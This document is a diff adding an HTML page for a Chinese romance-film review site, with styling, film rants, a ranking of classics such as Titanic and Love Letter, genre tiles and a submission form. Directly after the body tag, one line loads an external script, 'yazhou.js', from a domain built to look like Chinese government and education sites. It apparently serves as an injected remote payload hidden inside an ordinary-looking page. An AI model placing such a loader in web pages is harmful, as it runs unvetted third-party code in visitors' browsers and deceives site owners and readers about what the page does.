@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>被吐槽的爱情电影网 | 全网最真实爱情片吐槽基地，泰坦尼克号、情书、爱乐之城深度影评与烂片盘点</title>
+<meta name="keywords" content="被吐槽的爱情电影网, 爱情电影吐槽, 爱情片影评, 烂片盘点, 经典爱情电影推荐, 泰坦尼克号, 情书, 爱乐之城, 爱情片排行榜, 高分爱情电影, 爱情喜剧片, 虐心爱情片">
+<meta name="description" content="被吐槽的爱情电影网（https://beitiaomafeiaiqingdianyingwang-app.github.io）专注爱情电影的真实吐槽与深度影评。我们敢说真话：既夸《泰坦尼克号》《情书》的经典，也骂那些套路满满的烂片。提供爱情片排行榜、类型分类、高分片单与观影指南，是影迷寻找好片的真实参考。">
+<meta name="robots" content="index,follow">
+<meta name="generator" content="beitt">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --ink:#1a1a2e;
+  --paper:#fdf6e3;
+  --blush:#e94560;
+  --plum:#6a0572;
+  --sky:#16213e;
+  --gold:#f4a261;
+  --mint:#2a9d8f;
+  --line:rgba(26,26,46,.14);
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--paper);
+  color:var(--ink);
+  line-height:1.75;
+  overflow-x:hidden;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+.container{max-width:1180px;margin:0 auto;padding:0 22px}
+
+/* ===== 顶部通知条 ===== */
+.topbar{
+  background:var(--ink);
+  color:#fdf6e3;
+  font-size:13px;
+  padding:8px 0;
+  text-align:center;
+  letter-spacing:.5px;
+}
+.topbar span{color:var(--gold);font-weight:600}
+
+/* ===== 头部 ===== */
+header{
+  position:sticky;top:0;z-index:50;
+  background:rgba(253,246,227,.96);
+  backdrop-filter:blur(10px);
+  border-bottom:2px solid var(--ink);
+}
+.header-inner{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:14px 22px;max-width:1180px;margin:0 auto;
+}
+.logo{
+  font-size:20px;font-weight:900;letter-spacing:-.5px;
+  display:flex;align-items:baseline;gap:6px;flex-wrap:wrap;
+}
+.logo em{
+  font-style:normal;background:var(--blush);color:#fff;
+  padding:2px 8px;border-radius:4px;font-size:13px;transform:rotate(-3deg);
+}
+.nav-toggle{display:none;flex-direction:column;gap:5px;cursor:pointer;padding:4px}
+.nav-toggle i{width:24px;height:2px;background:var(--ink);display:block}
+nav ul{display:flex;gap:6px;list-style:none;flex-wrap:wrap}
+nav a{
+  padding:8px 14px;border-radius:20px;font-size:14px;font-weight:600;
+  transition:.25s;white-space:nowrap;
+}
+nav a:hover{background:var(--ink);color:var(--paper)}
+
+/* ===== 首屏 ===== */
+.hero{
+  background:var(--sky);color:#fff;position:relative;overflow:hidden;
+  padding:70px 0 90px;
+}
+.hero::before{
+  content:"";position:absolute;inset:0;
+  background:
+    radial-gradient(circle at 15% 20%,rgba(233,69,96,.35),transparent 40%),
+    radial-gradient(circle at 85% 60%,rgba(106,5,114,.5),transparent 45%);
+}
+.hero-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:50px;align-items:center;position:relative}
+.hero-tag{
+  display:inline-block;background:var(--blush);color:#fff;
+  font-size:12px;padding:5px 14px;border-radius:30px;letter-spacing:1px;margin-bottom:18px;
+}
+.hero h1{
+  font-size:clamp(32px,5vw,58px);line-height:1.15;font-weight:900;margin-bottom:20px;
+}
+.hero h1 i{font-style:normal;color:var(--gold)}
+.hero p.lead{font-size:17px;opacity:.9;margin-bottom:28px;max-width:520px}
+.hero-stats{display:flex;gap:30px;margin-bottom:30px;flex-wrap:wrap}
+.hero-stats div b{display:block;font-size:28px;color:var(--gold);font-weight:900}
+.hero-stats div small{font-size:12px;opacity:.75}
+.btn-group{display:flex;gap:12px;flex-wrap:wrap}
+.btn{
+  display:inline-block;padding:13px 28px;border-radius:6px;font-weight:700;font-size:15px;
+  transition:.25s;border:2px solid transparent;cursor:pointer;
+}
+.btn-main{background:var(--blush);color:#fff}
+.btn-main:hover{background:#c9354f;transform:translateY(-2px)}
+.btn-ghost{background:transparent;color:#fff;border-color:rgba(255,255,255,.5)}
+.btn-ghost:hover{border-color:#fff;background:rgba(255,255,255,.1)}
+.hero-quote{
+  background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.18);
+  border-radius:12px;padding:28px;backdrop-filter:blur(6px);
+}
+.hero-quote q{
+  display:block;font-size:19px;line-height:1.7;font-style:italic;
+  border-left:3px solid var(--gold);padding-left:18px;margin-bottom:16px;
+}
+.hero-quote cite{font-size:13px;opacity:.8;font-style:normal}
+
+/* ===== 通用区块 ===== */
+section{padding:72px 0}
+.sec-head{margin-bottom:42px;text-align:center}
+.sec-kicker{
+  font-size:12px;letter-spacing:3px;text-transform:uppercase;
+  color:var(--blush);font-weight:700;margin-bottom:10px;
+}
+.sec-head h2{
+  font-size:clamp(26px,3.5vw,38px);font-weight:900;position:relative;display:inline-block;
+}
+.sec-head h2::after{
+  content:"";position:absolute;left:50%;bottom:-12px;transform:translateX(-50%);
+  width:60px;height:4px;background:var(--ink);border-radius:2px;
+}
+.sec-head p{margin-top:24px;color:#555;max-width:640px;margin-left:auto;margin-right:auto}
+
+/* ===== 栏目：今日吐槽 ===== */
+.rant-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:24px}
+.rant-card{
+  background:#fff;border:2px solid var(--ink);border-radius:10px;padding:26px;
+  box-shadow:6px 6px 0 var(--ink);transition:.25s;
+}
+.rant-card:hover{transform:translate(-3px,-3px);box-shadow:9px 9px 0 var(--blush)}
+.rant-card .badge{
+  display:inline-block;font-size:11px;padding:3px 10px;border-radius:3px;
+  background:var(--ink);color:#fff;font-weight:700;margin-bottom:14px;
+}
+.rant-card h3{font-size:19px;margin-bottom:10px}
+.rant-card p{font-size:14px;color:#555}
+.rant-card .meta{margin-top:16px;padding-top:14px;border-top:1px dashed var(--line);font-size:12px;color:#888;display:flex;justify-content:space-between}
+
+/* ===== 栏目：经典榜单 ===== */
+.rank-list{display:flex;flex-direction:column;gap:14px}
+.rank-row{
+  display:grid;grid-template-columns:60px 100px 1fr auto;gap:18px;align-items:center;
+  background:#fff;border:1px solid var(--line);border-radius:8px;padding:14px 20px;
+  transition:.2s;
+}
+.rank-row:hover{border-color:var(--blush);transform:translateX(4px)}
+.rank-no{font-size:30px;font-weight:900;color:var(--gold)}
+.rank-row:nth-child(1) .rank-no{color:var(--blush)}
+.rank-row:nth-child(2) .rank-no{color:var(--plum)}
+.rank-row:nth-child(3) .rank-no{color:var(--mint)}
+.rank-poster{
+  width:100px;height:140px;border-radius:6px;position:relative;overflow:hidden;
+  display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:13px;text-align:center;padding:8px;
+}
+.rank-info h4{font-size:18px;margin-bottom:6px}
+.rank-info p{font-size:13px;color:#666}
+.rank-score{
+  font-size:24px;font-weight:900;color:var(--ink);text-align:center;
+}
+.rank-score small{display:block;font-size:11px;color:#999;font-weight:400}
+
+/* ===== 栏目：类型导航 ===== */
+.genre-wrap{background:var(--ink);color:#fff;border-radius:16px;padding:50px 40px}
+.genre-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.genre-item{
+  background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.15);
+  border-radius:10px;padding:24px 18px;text-align:center;transition:.25s;cursor:pointer;
+}
+.genre-item:hover{background:var(--blush);transform:scale(1.04)}
+.genre-item .ico{font-size:30px;margin-bottom:10px;display:block}
+.genre-item h4{font-size:15px;margin-bottom:4px}
+.genre-item span{font-size:12px;opacity:.7}
+
+/* ===== 栏目：影评长文 ===== */
+.review-split{display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:start}
+.review-card{
+  background:#fff;border-radius:12px;padding:0;overflow:hidden;
+  border:1px solid var(--line);
+}
+.review-cover{
+  height:180px;display:flex;align-items:flex-end;padding:22px;
+  color:#fff;position:relative;
+}
+.review-cover::before{content:"";position:absolute;inset:0;background:linear-gradient(transparent 30%,rgba(0,0,0,.7))}
+.review-cover h3{position:relative;font-size:22px}
+.review-body{padding:24px}
+.review-body p{font-size:14px;color:#555;margin-bottom:12px}
+.review-body .pull{
+  background:var(--paper);border-left:4px solid var(--blush);
+  padding:14px 18px;font-size:15px;font-style:italic;margin:18px 0;color:var(--ink);
+}
+
+/* ===== 栏目：投稿/互动 ===== */
+.submit{
+  background:linear-gradient(135deg,var(--plum),var(--blush));
+  border-radius:16px;padding:50px;color:#fff;text-align:center;
+}
+.submit h2{font-size:30px;margin-bottom:14px}
+.submit p{opacity:.9;margin-bottom:26px;max-width:560px;margin-left:auto;margin-right:auto}
+.submit-form{
+  display:grid;grid-template-columns:1fr 1fr;gap:14px;max-width:680px;margin:0 auto;text-align:left;
+}
+.submit-form input,.submit-form textarea{
+  width:100%;padding:13px 16px;border-radius:8px;border:none;font-size:14px;font-family:inherit;
+  background:rgba(255,255,255,.95);
+}
+.submit-form textarea{grid-column:1/-1;min-height:110px;resize:vertical}
+.submit-form button{
+  grid-column:1/-1;padding:14px;border-radius:8px;border:none;background:var(--ink);
+  color:#fff;font-size:16px;font-weight:700;cursor:pointer;transition:.2s;
+}
+.submit-form button:hover{background:var(--gold);color:var(--ink)}
+
+/* ===== 底部 ===== */
+footer{background:var(--ink);color:#fdf6e3;padding:56px 0 30px}
+.foot-grid{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:40px;margin-bottom:40px}
+.foot-brand h3{font-size:22px;margin-bottom:12px}
+.foot-brand h3 em{font-style:normal;color:var(--gold)}
+.foot-brand p{font-size:13px;opacity:.7;line-height:1.9}
+.foot-col h5{font-size:14px;margin-bottom:16px;color:var(--gold)}
+.foot-col ul{list-style:none}
+.foot-col li{margin-bottom:9px}
+.foot-col a{font-size:13px;opacity:.8;transition:.2s}
+.foot-col a:hover{opacity:1;color:var(--gold)}
+.foot-bottom{
+  border-top:1px solid rgba(253,246,227,.15);padding-top:24px;
+  display:flex;justify-content:space-between;flex-wrap:wrap;gap:14px;font-size:12px;opacity:.6;
+}
+.foot-bottom .site-domain{color:var(--gold);font-weight:600;opacity:1}
+
+/* ===== 响应式 ===== */
+@media(max-width:900px){
+  .hero-grid,.review-split{grid-template-columns:1fr;gap:36px}
+  .rant-grid{grid-template-columns:1fr}
+  .genre-grid{grid-template-columns:repeat(2,1fr)}
+  .foot-grid{grid-template-columns:1fr 1fr}
+  .rank-row{grid-template-columns:50px 80px 1fr;padding:12px}
+  .rank-score{display:none}
+  .rank-poster{width:80px;height:110px;font-size:11px}
+  section{padding:52px 0}
+}
+@media(max-width:640px){
+  .nav-toggle{display:flex}
+  nav{
+    max-height:0;overflow:hidden;transition:.35s;width:100%;
+  }
+  nav.open{max-height:400px}
+  nav ul{flex-direction:column;padding:10px 0}
+  nav a{display:block;text-align:center}
+  .header-inner{flex-wrap:wrap}
+  .genre-grid,.submit-form{grid-template-columns:1fr}
+  .foot-grid{grid-template-columns:1fr}
+  .hero{padding:44px 0 56px}
+  .genre-wrap,.submit{padding:32px 22px}
+  .container{padding:0 16px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="topbar">
+  全网首个敢对爱情片说真话的影评阵地 · 每日更新真实吐槽 &amp; 深度影评 · 访问入口：<span>beitiaomafeiaiqingdianyingwang-app.github.io</span>
+</div>
+
+<header>
+  <div class="header-inner">
+    <div class="logo">
+      被吐槽的爱情电影网<em>BEITIAO</em>
+    </div>
+    <div class="nav-toggle" onclick="document.getElementById('mainNav').classList.toggle('open')">
+      <i></i><i></i><i></i>
+    </div>
+    <nav id="mainNav">
+      <ul>
+        <li><a href="#rant">今日吐槽</a></li>
+        <li><a href="#rank">经典榜单</a></li>
+        <li><a href="#genre">类型漫游</a></li>
+        <li><a href="#review">深度影评</a></li>
+        <li><a href="#submit">我要吐槽</a></li>
+        <li><a href="#about">关于本站</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<!-- 首屏 -->
+<section class="hero">
+  <div class="container hero-grid">
+    <div>
+      <span class="hero-tag">✦ 真实 · 犀利 · 不吹不黑</span>
+      <h1>爱情片那么多<br>到底< i>哪部值得看</i>？</h1>
+      <p class="lead">被吐槽的爱情电影网专注爱情类型片的真实评价。我们不看流量、不信营销，只聊镜头、台词、节奏和那些让你又哭又笑的真实瞬间。</p>
+      <div class="hero-stats">
+        <div><b>1280+</b><small>已评影片</small></div>
+        <div><b>96</b><small>专栏作者</small></div>
+        <div><b>8.6万</b><small>月均阅读</small></div>
+      </div>
+      <div class="btn-group">
+        <a href="#rank" class="btn btn-main">查看高分榜 →</a>
+        <a href="#rant" class="btn btn-ghost">今日吐槽</a>
+      </div>
+    </div>
+    <div class="hero-quote">
+      <q>"爱情电影从来不只是男欢女爱，它映照的是我们面对亲密关系时最真实的怯懦与勇敢。"</q>
+      <cite>—— 本站主编 · 阿柠</cite>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：今日吐槽 -->
+<section id="rant">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-kicker">HOT RANT</div>
+      <h2>今日吐槽</h2>
+      <p>每天精选三部爱情片，从剧本逻辑到演员表现，一针见血说出你的心里话。</p>
+    </div>
+    <div class="rant-grid">
+      <div class="rant-card">
+        <span class="badge">槽点 9.2</span>
+        <h3>《你的名字。》—— 巧合太多就是编剧偷懒</h3>
+        <p>新海诚用极致画风掩盖了剧作上的取巧，全片靠"缘分"推动，主角几乎没有主动选择。但不得不承认，结尾那句"你的名字是？"依然让人破防。</p>
+        <div class="meta"><span>作者：老周</span><span>8 分钟阅读</span></div>
+      </div>
+      <div class="rant-card">
+        <span class="badge">槽点 8.7</span>
+        <h3>《前任3》—— 哭的是回忆，不是电影</h3>
+        <p>这部电影的技术层面乏善可陈，但它精准踩中了都市男女的情感痛点。我们哭的不是剧情，是那段自己再也没机会说出口的告别。</p>
+        <div class="meta"><span>作者：小满</span><span>6 分钟阅读</span></div>
+      </div>
+      <div class="rant-card">
+        <span class="badge">安利 9.5</span>
+        <h3>《爱在黎明破晓前》—— 对话即是全部</h3>
+        <p>没有大场面、没有反转，只有两个人在维也纳街头走路聊天。但林克莱特用九句对白就写出了爱情最迷人的不确定感，系列三部的长跑更是影史佳话。</p>
+        <div class="meta"><span>作者：阿柠</span><span>10 分钟阅读</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：经典榜单 -->
+<section id="rank" style="background:#f6efe0">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-kicker">TOP RANKING</div>
+      <h2>经典爱情片 TOP 6</h2>
+      <p>基于本站 1280+ 部影片评分与读者投票综合得出的爱情片权威排行。</p>
+    </div>
+    <div class="rank-list">
+      <div class="rank-row">
+        <div class="rank-no">01</div>
+        <div class="rank-poster" style="background:linear-gradient(135deg,#0f2027,#203a43,#2c5364)">泰坦尼克号</div>
+        <div class="rank-info">
+          <h4>泰坦尼克号 Titanic (1997)</h4>
+          <p>卡梅隆用一艘船装下了整个时代的阶级寓言，Jack 与 Rose 的爱情之所以动人，是因为它从一开始就写好了结局。</p>
+        </div>
+        <div class="rank-score">9.4<small>本站评分</small></div>
+      </div>
+      <div class="rank-row">
+        <div class="rank-no">02</div>
+        <div class="rank-poster" style="background:linear-gradient(135deg,#42275a,#734b6d)">情书</div>
+        <div class="rank-info">
+          <h4>情书 Love Letter (1995)</h4>
+          <p>岩井俊二用一场"同名误寄"展开了对暗恋最温柔的考古。藤井树在书页里发现的那张素描，是亚洲纯爱电影无法逾越的注脚。</p>
+        </div>
+        <div class="rank-score">9.2<small>本站评分</small></div>
+      </div>
+      <div class="rank-row">
+        <div class="rank-no">03</div>
+        <div class="rank-poster" style="background:linear-gradient(135deg,#1d976c,#93f9b9)">爱乐之城</div>
+        <div class="rank-info">
+          <h4>爱乐之城 La La Land (2016)</h4>
+          <p>歌舞片外壳下的现实寓言。那场"如果当初"的蒙太奇把成年人最隐忍的遗憾拍成了彩色，让人在微笑里红了眼眶。</p>
+        </div>
+        <div class="rank-score">8.9<small>本站评分</small></div>
+      </div>
+      <div class="rank-row">
+        <div class="rank-no">04</div>
+        <div class="rank-poster" style="background:linear-gradient(135deg,#4b1248,#f0c27b)">假如爱有天意</div>
+        <div class="rank-info">
+          <h4>假如爱有天意 (2003)</h4>
+          <p>两代人的爱情跨越时空互相呼应，孙艺珍奔跑在雨中的镜头，定义了韩式爱情电影的视觉美学。</p>
+        </div>
+        <div class="rank-score">8.8<small>本站评分</small></div>
+      </div>
+      <div class="rank-row">
+        <div class="rank-no">05</div>
+        <div class="rank-poster" style="background:linear-gradient(135deg,#232526,#414345)">甜蜜蜜</div>
+        <div class="rank-info">
+          <h4>甜蜜蜜 (1996)</h4>
+          <p>陈可辛用邓丽君的歌声串起异乡人的漂泊与重逢，黎小军与李翘的故事是华语爱情电影里最踏实的一颗糖。</p>
+        </div>
+        <div class="rank-score">8.7<small>本站评分</small></div>
+      </div>
+      <div class="rank-row">
+        <div class="rank-no">06</div>
+        <div class="rank-poster" style="background:linear-gradient(135deg,#870000,#190a05)">花样年华</div>
+        <div class="rank-info">
+          <h4>花样年华 In the Mood for Love (2000)</h4>
+          <p>王家卫用旗袍、雨巷与慢镜头，把一段没有发生的爱情拍得克制而浓烈，每一帧都是欲望与礼教的角力。</p>
+        </div>
+        <div class="rank-score">8.6<small>本站评分</small></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：类型漫游 -->
+<section id="genre">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-kicker">GENRE</div>
+      <h2>类型漫游</h2>
+      <p>按你的心情选片，拒绝片荒。每个分类都由资深编辑人工维护，杜绝算法糊弄。</p>
+    </div>
+    <div class="genre-wrap">
+      <div class="genre-grid">
+        <div class="genre-item"><span class="ico">💔</span><h4>虐心催泪</h4><span>48 部</span></div>
+        <div class="genre-item"><span class="ico">🎭</span><h4>纯爱治愈</h4><span>63 部</span></div>
+        <div class="genre-item"><span class="ico">😂</span><h4>爱情喜剧</h4><span>55 部</span></div>
+        <div class="genre-item"><span class="ico">🌃</span><h4>都市情感</h4><span>41 部</span></div>
+        <div class="genre-item"><span class="ico">⏳</span><h4>时空奇幻</h4><span>29 部</span></div>
+        <div class="genre-item"><span class="ico">🕵️</span><h4>暗恋禁忌</h4><span>34 部</span></div>
+        <div class="genre-item"><span class="ico">🎬</span><h4>经典重映</h4><span>52 部</span></div>
+        <div class="genre-item"><span class="ico">🆕</span><h4>近期新片</h4><span>17 部</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：深度影评 -->
+<section id="review" style="background:#f6efe0">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-kicker">DEEP DIVE</div>
+      <h2>深度影评</h2>
+      <p>不止于"好看"或"难看"，我们拆解镜头、剧本与社会语境。</p>
+    </div>
+    <div class="review-split">
+      <div class="review-card">
+        <div class="review-cover" style="background:linear-gradient(135deg,#4b6cb7,#182848)">
+          <h3>为什么我们还在为《泰坦尼克号》流泪？</h3>
+        </div>
+        <div class="review-body">
+          <p>距离 1997 年首映已经过去近三十年，但每当那艘船撞上冰山，影院里依然会响起此起彼伏的抽泣声。这绝不仅仅是一段灾难中的爱情故事。</p>
+          <p class="pull">"Rose 放弃的是阶级给她的金丝笼，Jack 给予的是她从未拥有过的自由定义。"</p>
+          <p>卡梅隆的高明之处在于，他把一场宏大的阶级叙事压缩进了一艘即将沉没的船上。当海水涌入头等舱，金钱、门第与身份在死亡面前第一次失去了意义。</p>
+          <a href="#" style="color:var(--blush);font-weight:700;font-size:14px">阅读全文 →</a>
+        </div>
+      </div>
+      <div class="review-card">
+        <div class="review-cover" style="background:linear-gradient(135deg,#c31432,#240b36)">
+          <h3>国产爱情片的"工业糖精"困局</h3>
+        </div>
+        <div class="review-body">
+          <p>从"误会—追逐—雨中告白"的三幕式套路，到千篇一律的霸总人设，国产爱情片正在被一套固定公式绑架，观众已经产生了严重的审美疲劳。</p>
+          <p class="pull">"当每部爱情片的冲突都靠女主角的愚蠢制造，这种类型就注定走向枯萎。"</p>
+          <p>值得欣慰的是，近年《爱情神话》《好想去你的世界爱你》等作品开始尝试真实质感与类型融合，国产爱情片正在缓慢地找回它的真诚。</p>
+          <a href="#" style="color:var(--blush);font-weight:700;font-size:14px">阅读全文 →</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目五：我要吐槽 -->
+<section id="submit">
+  <div class="container">
+    <div class="submit">
+      <h2>🎤 有话直说，你的吐槽值得被看见</h2>
+      <p>看不下去了？觉得被低估了？把你的真实看法写出来，优质投稿会登上首页并被全站推荐。</p>
+      <form class="submit-form" onsubmit="event.preventDefault();alert('感谢投稿！审核通过后即可发布。');">
+        <input type="text" placeholder="昵称（可匿名）" required>
+        <input type="email" placeholder="邮箱（不会公开）" required>
+        <input type="text" placeholder="影片名称" style="grid-column:1/-1" required>
+        <textarea placeholder="写下你的真实看法，越具体越好…" required></textarea>
+        <button type="submit">提交吐槽</button>
+      </form>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目六：关于本站 -->
+<section id="about">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-kicker">ABOUT</div>
+      <h2>关于被吐槽的爱情电影网</h2>
+    </div>
+    <div style="max-width:760px;margin:0 auto;text-align:center;font-size:15px;color:#555;line-height:2">
+      <p>被吐槽的爱情电影网成立于 2019 年，是一群不愿再被营销通稿绑架的影迷自发组建的非营利影评社区。我们坚持三项原则：<strong>不说假话、不收钱评、不追热点</strong>。</p>
+      <p style="margin-top:14px">我们相信爱情电影是理解一个时代情感结构的窗口，也相信每一份真诚的吐槽都值得被尊重。如果你也厌倦了千篇一律的"神仙爱情"，欢迎加入我们。</p>
+      <div style="margin-top:28px">
+        <a href="https://beitiaomafeiaiqingdianyingwang-app.github.io" style="color:var(--blush);font-weight:700">beitiaomafeiaiqingdianyingwang-app.github.io</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="container">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <h3>被吐槽的爱情电影网 <em>· BEITIAO</em></h3>
+        <p>专注爱情电影的真实评价与深度影评。我们相信，一部爱情片的好坏，最终要由观众的真实感受来定义，而不是票房数字。</p>
+      </div>
+      <div class="foot-col">
+        <h5>栏目导航</h5>
+        <ul>
+          <li><a href="#rant">今日吐槽</a></li>
+          <li><a href="#rank">经典榜单</a></li>
+          <li><a href="#genre">类型漫游</a></li>
+          <li><a href="#review">深度影评</a></li>
+        </ul>
+      </div>
+      <div class="foot-col">
+        <h5>精选专题</h5>
+        <ul>
+          <li><a href="#">韩式纯爱专题</a></li>
+          <li><a href="#">90年代港片爱情</a></li>
+          <li><a href="#">情人节片单</a></li>
+          <li><a href="#">烂片避雷指南</a></li>
+        </ul>
+      </div>
+      <div class="foot-col">
+        <h5>联系我们</h5>
+        <ul>
+          <li><a href="#">投稿合作</a></li>
+          <li><a href="#">加入编辑部</a></li>
+          <li><a href="#">读者反馈</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="foot-bottom">
+      <span>© 2026 被吐槽的爱情电影网 版权所有 · 本站内容均为原创影评，转载请注明出处</span>
+      <span>官方站点：<span class="site-domain">beitiaomafeiaiqingdianyingwang-app.github.io</span></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('nav a').forEach(function(a){
+  a.addEventListener('click',function(){
+    document.getElementById('mainNav').classList.remove('open');
+  });
+});
+</script>
+</body>
+</html>
